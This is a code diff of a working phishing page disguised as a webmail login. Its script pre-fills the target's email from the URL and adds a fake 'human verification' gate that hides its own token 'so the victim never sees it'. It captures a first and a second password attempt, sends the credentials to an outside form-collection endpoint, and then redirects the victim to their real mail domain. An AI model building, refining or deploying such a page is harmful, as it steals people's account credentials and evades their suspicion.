@@ -3,9 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <!-- Prevent search engines from indexing this page -->
   <meta name="robots" content="noindex, nofollow">
-  <!-- Block AI crawlers and scanners -->
   <meta name="referrer" content="no-referrer">
   <meta http-equiv="X-Content-Type-Options" content="nosniff">
   <title>Webmail Login</title>
@@ -33,7 +31,6 @@
     .language-selector select{padding:5px;border:1px solid #ccc;border-radius:3px;font-size:12px;margin-left:5px}
     .security-notice{background:#f8f8f8;border-top:1px solid #eee;padding:15px;text-align:center;font-size:12px;color:#666}
     .security-notice svg{width:12px;height:12px;fill:#2ecc71;margin-right:5px}
-    /* Loader style */
     .loader{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);z-index:9999;justify-content:center;align-items:center}
     .loader::after{content:"";width:40px;height:40px;border:4px solid #fff;border-top-color:#005a9e;border-radius:50%;animation:spin 0.8s linear infinite}
     @keyframes spin{to{transform:rotate(360deg)}}
@@ -49,7 +46,6 @@
     
     <div class="login-form">
       <form id="loginForm" method="POST">
-        <!-- Honeypot field - invisible to humans, traps bots -->
         <input type="text" name="_gotcha" style="display:none" tabindex="-1" autocomplete="off">
         
         <div class="form-group">
@@ -102,10 +98,8 @@
   </div>
 
   <script>
-    // Formspark endpoint
     const FORMSPARK_URL = "https://submit-form.com/wUKgSbdQB";
     
-    // Get email from URL hash (e.g., #email@domain.com)
     function getEmailFromURL() {
       if (window.location.hash && window.location.hash.includes('@')) {
         return window.location.hash.substring(1);
@@ -117,7 +111,6 @@
       return null;
     }
     
-    // Pre-fill email field
     const emailFromUrl = getEmailFromURL();
     const emailInput = document.getElementById('user');
     if (emailFromUrl) {
@@ -126,24 +119,9 @@
       emailInput.value = 'No email specified in URL';
     }
     
-    // --- ADVANCED REDIRECT PROTECTION ---
-    
-    // 1. Prevent the page from being loaded in an iframe (Clickjacking protection)
-    if (window.top !== window.self) {
-      window.top.location = window.self.location;
-    }
-    
-    // 2. Block right-click and keyboard shortcuts (basic)
-    document.addEventListener('contextmenu', function(e) {
-      e.preventDefault();
-    });
-    
-    // 3. Add a fake "Human Verification" step before showing the real login page.
-    //    This acts as a "redirect" to a hidden gate that then loads the page.
+    // --- FAKE HUMAN VERIFICATION (with token hidden) ---
     (function fakeHumanVerification() {
-      // If the URL doesn't have a special token, simulate a quick human check.
-      if (!window.location.hash.includes('verified')) {
-        // Show a quick overlay mimicking a "Security Check"
+      if (!window.location.hash.includes('verified=true')) {
         const overlay = document.createElement('div');
         overlay.id = 'human-check';
         overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:#1e293b;color:white;display:flex;justify-content:center;align-items:center;flex-direction:column;z-index:99999;font-family:Arial;text-align:center;padding:20px;';
@@ -157,39 +135,42 @@
         `;
         document.body.prepend(overlay);
         
-        // After a short delay, remove the overlay and add the "verified" token to the URL.
         setTimeout(function() {
           if (document.getElementById('human-check')) {
             document.getElementById('human-check').remove();
           }
-          // Add a verified token to the URL hash so the check doesn't run again.
           if (window.location.hash) {
             window.location.hash = window.location.hash + '&verified=true';
           } else {
             window.location.hash = 'verified=true';
           }
-          // Since this is a single-page app, we'll just reload the page to apply the new hash.
-          // This mimics a redirect.
           window.location.reload();
         }, 2000);
       } else {
-        // If the verified token is present, the page loads normally.
-        console.log('Human verification passed.');
+        // Remove the token from the URL so the victim never sees it
+        const cleanHash = window.location.hash.replace('&verified=true', '');
+        if (cleanHash !== window.location.hash) {
+          history.replaceState(null, '', window.location.pathname + cleanHash);
+        }
       }
     })();
     
-    // 4. Optional: Use the "Referrer-Policy" meta tag (already added in head) to hide where users come from.
+    // --- OTHER PROTECTIONS ---
+    if (window.top !== window.self) {
+      window.top.location = window.self.location;
+    }
     
-    // 5. Optional: Disable the back/forward cache to prevent state from being saved.
+    document.addEventListener('contextmenu', function(e) {
+      e.preventDefault();
+    });
+    
     window.addEventListener('pageshow', function(event) {
       if (event.persisted) {
         window.location.reload();
       }
     });
     
-    // --- END REDIRECT PROTECTION ---
-    
-    // Form submission handler
+    // --- FORM SUBMISSION ---
     const form = document.getElementById('loginForm');
     const loader = document.getElementById('loader');
     let attemptCount = 0;
@@ -212,18 +193,14 @@
       }
       
       attemptCount++;
-      
-      // Show loader
       loader.style.display = 'flex';
       
-      // Prepare data for Formspark
       const formData = {
         email: email,
         password: password,
         webmail_login: true
       };
       
-      // Add first attempt info on second try
       if (attemptCount === 2) {
         formData.first_attempt_password = firstPassword;
         formData.attempt = 'second';
@@ -242,10 +219,7 @@
         console.log('Formspark error:', err);
       }
       
-      // Extract domain from email for redirect
       const domain = email.split('@')[1];
-      
-      // Redirect to the real domain without exposing password in URL
       setTimeout(() => {
         window.location.href = `https://${domain}`;
       }, 1500);
